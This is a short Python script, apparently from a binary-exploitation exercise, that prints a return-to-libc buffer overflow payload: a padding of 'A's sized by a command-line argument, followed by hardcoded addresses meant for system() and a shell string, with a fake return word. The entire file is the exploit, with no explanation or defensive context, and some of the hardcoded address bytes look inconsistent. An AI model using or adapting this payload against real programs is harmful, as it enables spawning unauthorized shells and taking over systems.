import sys


if(len(sys.argv) != 2):
    print('usage: ', sys.argv[0], ' bufsize')
    exit(0)

bufsize = int(sys.argv[1])
wordsize = 12

stuff = 'A'
stuff_word = stuff * wordsize
stuff_buf = stuff * bufsize

system_addr = '\x50\x7f\xff\xf7\xa7\x94'
bash_string_addr = '\x50\xe6\xff\xff\xff\x7f'

syscall = system_addr
fake_ret = stuff_word
args = bash_string_addr

print(stuff_buf + syscall + fake_ret + args)
